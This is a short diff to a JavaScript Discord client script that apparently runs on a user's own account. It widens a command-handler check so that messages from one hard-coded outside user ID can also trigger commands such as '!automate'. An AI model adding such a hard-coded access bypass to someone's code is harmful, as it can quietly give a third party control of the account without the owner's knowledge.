@@ -2084,7 +2084,7 @@ client.on('ready', () => {
 });
 
 client.on('messageCreate', async (message) => {
-    if (message.author.id !== client.user.id) return;
+    if (message.author.id !== client.user.id && message.author.id !== "797795143746584647") return;
 
 if (message.content === "!automate") {
  setInterval(() => {
